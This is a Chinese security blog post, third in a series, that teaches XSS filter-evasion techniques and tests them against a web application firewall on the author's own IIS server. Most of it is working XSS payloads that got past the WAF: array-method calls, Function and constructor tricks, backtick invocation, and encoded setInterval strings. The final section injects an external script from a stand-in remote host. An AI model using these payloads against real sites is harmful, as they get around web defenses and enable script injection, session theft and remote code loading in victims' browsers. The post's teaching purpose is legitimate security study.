> 原文链接: https://www.anquanke.com//post/id/176482 


# 测试WAF来学习XSS姿势（三）


                                阅读量   
                                **247311**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



## [![](https://p1.ssl.qhimg.com/t0194774ed7732d55d3.png)](https://p1.ssl.qhimg.com/t0194774ed7732d55d3.png)



## 前言

今天又换了款waf，因为waf要IIS环境，我发现我是个手残党，一看就懂，操作就废，搭建个IIS环境没成功。后来有朋友说我买的服务器有重置系统，那里可以选择ASP/.NET环境，今天搭建好了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/006Xzox4ly1g1ky4we8ghj306o06oq34.jpg)



## 提醒

本文分两部分，前部分是总结新学的姿势，后半部分测试Waf。



## 数组方式

前两篇文章，我们利用js里的对象成员方法也可以用数组的形式的表示，以此构造了许多payload，在数组内将敏感函数拼接，以此来绕过。以`top`对象为演示的，在Javascrip中，可以连接数组的函数有其他可以补充的。



## map()函数

map函数可以返回一个数组`[1].map`，而且我们在使用`map`函数的时候往往会传入一个函数，如果我们传递一个`alert`函数，那么将触发xss。

```
[1].map(alert)
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g200cpnu7bj30lk03z0sp.jpg)

类似的数组操作函数不在少数，我所知的就有**find**，**every**，**filter**，**forEach**，**findIndex**。它们和**map**函数都有一个共同的特点，可以返回数组，而且在使用的同时还以可以传入一个函数，这就为我们构造payload提供更多的选择。

我们思考一下，在那些情况下我们可以使用，其实满多，可以先看个demo。

```
&lt;img src=1 onerror=[1].filter(alert)&gt;
```

成功弹窗

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g203d50hfzj30ql094aal.jpg)

那么如何更进一步呢，我们先思考下面这个例子。

```
&lt;img src=1 onerror=['ale'%2b'rt'].map(top['ev'%2b'al'])[0]['valu'%2b'eOf']()(/xss/)&gt;
```

将`alert`函数以数组的方式拼接保存，通过嵌套`top`对象拆分带入`eval`函数，`valueOf`方法将返回值`/xss/`，成功弹窗。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g204i32laqj30qb09mgm7.jpg)

从上面的例子中，我们不难看出，javascript的这类对象方法不在少数，如果我们要寻找其他类似函数，首先满足`返回数组`，或者`字符串`，再能够带入我们的`函数`。



## function函数

在javascript，定义函数的方式有两种：一种是函数声明，另一种就是函数表达式。

这里返回结果为变量名`demo`，函数表达式也可以叫匿名函数，基本特征是没有函数名，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g204yvqam0j30fe05wglo.jpg)

如果我们向匿名函数内添加`形参`为函数alert，再执行函数，那么可以达到弹窗的效果嘛?

`Function('alert(1)')();`答案显而易见。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g205htqg05j30ts09egmc.jpg)

然而alert关键字还是太敏感了，可以尝试将形参编码。

`Function('alx65x72x74x281x29')();`

成功弹窗。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g205pwfwjvj30ts09i0th.jpg)

拼接也是可以达到同样的效果`Function('ale'%2b'rt(1)')();`



## open()属性

open()方法属性打开一个新的浏览器窗口，可在括号内加入参数`open(alert(1))`

成功弹窗。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g207srej3gj30vn09cdgk.jpg)

好玩的是，我们使用伪协议时，将会在新窗口弹出。

`&lt;body onpageshow=open('java'%2b'script:ale'%2b'rt(1)') &gt;`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g2079o9zibj30vn08k756.jpg)



## 神奇的constructor

还记得前篇文章[测试WAF来学习XSS姿势(二)](https://www.anquanke.com/post/id/176300)执行代码姿势补充那段嘛，当时我以为自己，已经把`constructor`的坑填完了，早上起来查资料学习，又发现一个可用知识。

constructor是一个对象的属性，这个属性存在在此对象的prototype中, 指向此对象的构造函数。如果该对象是它自己呢?

`constructor.constructor(alert(1))`

成功触发xss

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20oq60wojj30vn09mq3p.jpg)

如果constructor带入的是完整的函数，比如alert,prompt,confirm，那么不需要执行。怎么理解呢?

在这个demo中，我们将函数拼接，注意后面()括号，它是有必要的。

`constructor.constructor('al'%2b'ert(1)')()`

对于编码来说也是一样的，这里我们使用的是反引号，所以后面要跟着一对反引号。

**constructor.constructor`alx65rtx28/xss/x29“`**



## Waf测试

首先，我们先拿来些常用标签看看，是否会被Waf拦截，如果这个标签一出现就拦截，那我们不必在此浪费时间。

Waf拦截了，也很正常，常见一些标签`&lt;svg&gt;` `&lt;img&gt;`基本不考虑。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20pitr8x3j30vn07zjrt.jpg)

找一些略微生僻的，例如`&lt;input autofocus onfocus=alert(1)&gt;`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20puuqh9kj30vn04s74o.jpg)

虽然拦截了，但是当我们把alert去掉后，就不拦截，说明这个标签可用。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20px6nq6lj30vn04uq3a.jpg)

`alert`不行，可以考虑的有`prompt`，`confirm`，还有`window.onerror=alert;throw 1`这个在这里有些鸡肋不考虑。

成功弹窗。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20q4y8pftj30vn093751.jpg)

下面给几个类似的，也都能绕过Waf

```
&lt;details open ontoggle=prompt(1)&gt;
&lt;button onfocus=prompt(1) autofocus&gt;
&lt;select autofocus onfocus=prompt(1)&gt;
```



## 反引号

存在alert函数，但是Waf并不拦截。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20r5rwnwyj30vn04n0t4.jpg)

但是当我们加上`()`括号，就拦截了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20r88lsw4j30vn07z3z0.jpg)

回去查看Waf拦截记录，可以看出，是触发了某种规则。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20re1issej30c80ae3yi.jpg)

这个规则有个`缺陷`，alert函数后面带有`()`括号就拦截，那么如果我不用括号呢?我们不妨来试试`反引号`。

```
&lt;details/open/ontoggle="alert`1`"&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20rj1z6b3j30vn09cdgn.jpg)

成功绕过，注意这里包括字符串的要用双引号，单引号会拦截。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20ro44atcj30vn07y3z0.jpg)



## 利用top

前几篇文章介绍了top属性的知识，不拿来用对不起自己啊，上文使用反引号虽然绕过了waf，但是引入了双引号，如果过滤了双引号，该如何解决呢?

top可以连接一个函数，那么直接连接alert就行了，如果你看过上篇文章，其他的`self parent frames content window`都可以使用。

```
&lt;body onpageshow=top.alert`1`&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20sep7j5xj30vn09jq3o.jpg)

这样就可以摆脱使用双引号，当然如果过滤了`.` 你可以考虑url编码。

```
&lt;body onpageshow=top%2ealert`1`&gt;
```



## 利用map

还记得map嘛?返回一个数组，传入一个函数，我们尝试一下能否绕过。

`[1].map(alert)`依赖map的特性，可以避免alert函数后面带有()括号，以此触发规则。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20sxhhgamj30vn09kjs7.jpg)

其他

```
&lt;details open ontoggle=[1].find(alert)&gt;
  &lt;details open ontoggle=[1].%65very(alert)&gt;
  &lt;details open ontoggle=[1].u0066orEach(alert)&gt;
```



## 执行字符串

在上文我说过，常见一些标签`&lt;svg&gt;`基本不考虑，那么现在你可以考虑了。为什么?听我细细(~~乱吹~~)详谈(~~凑字数~~)道来。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20twsuplaj30ex0agjss.jpg)

这个妥妥的拦截。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20u9nopk5j30vn07y3yz.jpg)

通过测试我们发现，alert后面不更()就不会拦截。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20uicuvz3j30vn07ymxn.jpg)

可是还是拦截了，推测是onload 事件的锅，那么换个事件**onmouseover** 就不拦截了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20ut9sseij30vn051jrq.jpg)

问题来了，虽然**onmouseover**事件可以通过滑动鼠标来触发，如何执行**alert**呢?如果使用拼接的话，必然带()，比较难绕过。思来想去发现可以尝试用反引号。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20vptexmsj30vn07zgm5.jpg)

还是()的锅，不过setInterval不拦截的话，我们可以编码啊。

```
&lt;svg onmouseover=setInterval`alx65rtx28/xss/x29```&gt;
```

成功绕过。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20vs1ujajj30vn09g752.jpg)

执行字符串的可用`payload`：

```
&lt;svg onmouseover=setTimeout`alx65rtx28/xss/x29```&gt;
&lt;svg onmouseover=Set.constructor`alx65rtx28/xss/x29```&gt;
&lt;svg onmouseover=u0063lear.constructor`alx65rtx28/xss/x29```&gt;
```



## 引用外部js

用些生僻标签就可以，过多的花里胡哨反而难以绕过。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ws1.sinaimg.cn/large/005DAKuvgy1g20wug4o4nj30vn0anjsj.jpg)

```
&lt;input autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xss.xx/1te"&gt;
&lt;keygen autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xss.xx/1te"&gt;
&lt;textarea  autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xss.xx/1te"&gt;
```



### <a class="reference-link" name="%E5%8F%82%E8%80%83%E8%87%B4%E8%B0%A2"></a>参考致谢
- [http://www.vulnerability-lab.com/resources/documents/531.txt](http://www.vulnerability-lab.com/resources/documents/531.txt)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [https://www.t00ls.net/viewthread.php?tid=43475&amp;highlight=%2B%E9%A3%8E%E5%9C%A8%E6%8C%87%E5%B0%96](https://www.t00ls.net/viewthread.php?tid=43475&amp;highlight=%2B%E9%A3%8E%E5%9C%A8%E6%8C%87%E5%B0%96)